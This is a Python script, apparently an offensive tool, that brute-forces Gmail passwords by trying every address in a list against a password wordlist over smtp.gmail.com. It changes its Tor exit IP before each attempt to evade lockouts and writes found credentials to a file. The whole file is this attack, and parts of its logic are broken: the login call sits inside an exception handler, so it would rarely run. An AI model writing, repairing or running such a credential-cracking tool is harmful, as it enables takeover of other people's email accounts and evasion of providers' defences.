import requests
from stem.control import Controller
from stem import Signal
import smtplib,json

import os
try:
    from colorama import Fore

except ModuleNotFoundError:
    os.system("pip install colorama")

from setup.banner import banner , banner2 , clear
from setup.colors import r,c,g,y,ran,lg
from setup.sprint import sprint


try:
    import socks
except ModuleNotFoundError:
    os.system("pip install socks")

try:
    import pyngrok
except ModuleNotFoundError:
    os.system("pip install pyngrok")



def renew_connection():
    with Controller.from_port(port=9051) as c:
        c.authenticate()
        c.signal(Signal.NEWNYM)

def get_tor_session():
    session = requests.Session()

    session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
    return session

def changeip():
    B = Fore.BLUE
    G = Fore.GREEN
    W = Fore.WHITE

    ipc = requests.get("https://httpbin.org/ip").json()['origin']
    print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
    renew_connection()
    s = get_tor_session()
    por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
    ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
    print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")


clear()
banner()
yes = ["y" , "yes"]
no = ["n" , "no"]

try:
    em_choice = input(ran + "Enter path of email: "+g)
except FileNotFoundError:
    sprint(r + "File not found")
    exit(0)

try:
    pass_choice = input(y + "Do you want to use default wordlist? "+r+"(y/n) :"+g).lower()
    if pass_choice in yes:
        passlist = r"files/passwords.txt"
    else:
        passlist = input(c + "Enter path of worlist: "+g)
except FileNotFoundError:
    sprint(r + "File not found")
    exit(0)


o_pass = r"files/passwords.txt"
o_tried = r"files/tried.txt"
o_found = r"files/found.txt"


passwords = [i.strip("\n") for i in open(passlist , "r").readlines()]
tried = [i.strip("\n") for i in open("files/tried.txt")]
found = [i.strip("\n") for i in open("files/found.txt" , "r").readlines()]
mails = [i.strip("\n") for i in open(em_choice , "r").readlines()]


def cracker():

    for m in mails:
        print(f"{y}Fetching mail {r}{str(m)}")
        for n , password in enumerate(passwords):
            tot_pass = str(len(passwords))
            print(f"{c}Trying password {r}{str(password)}: {g}{str(n)}/{y}{tot_pass}")
            changeip()
            with open(o_tried , "a") as f:
                f.write(f"{m} -- {password}\n")
            try :

                    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
                    smtpserver.ehlo()
                    smtpserver.starttls()
            except smtplib.SMTPServerDisconnected:
                    print(r + "Something went wrong.")

                    try :

                        smtpserver.login(m , password)
                        with open(o_found , "a") as fo:
                            fo.write(f"{m} {password}")
                        print(y +"Password Found:"+c + str(password))
                        with open(o_found , "a") as fo:
                            fo.write(f"{m} {password}")
                        smtpserver.close()
            
                        break
                    except smtplib.SMTPAuthenticationError:
                        print("failed")
                        continue

                    
cont = ""
while cont not in no:
    cracker()
    ch = input(f"{ran}Continue? {y}(y/n): "+r).lower()

    if ch in no:
        clear
        banner2()

    else:
        banner2()



